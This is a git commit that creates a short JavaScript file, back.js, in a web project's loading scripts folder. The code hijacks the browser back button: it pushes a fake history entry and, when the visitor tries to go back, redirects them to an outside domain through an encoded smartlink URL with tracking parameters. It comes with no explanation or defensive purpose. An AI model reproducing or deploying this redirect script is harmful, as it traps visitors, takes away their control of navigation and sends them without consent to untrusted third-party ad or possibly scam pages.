c51563048e005c91278faf26b3f84ab5f350fe31
jandarahasia <85703474+jandarahasia@users.noreply.github.com>
2021-12-02 19:32:35 +0700

    Create back.js

---
+++ loading/script/back.js
@@ -0,0 +1,7 @@
+  if (typeof history.pushState === "function") {
+	history.pushState("back", null, null);
+	window.onpopstate = function() {
+	    history.pushState("back", null, null);
+	      	window.location.href = "https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=github&si2=jandarahasia";
+	    }
+  	};
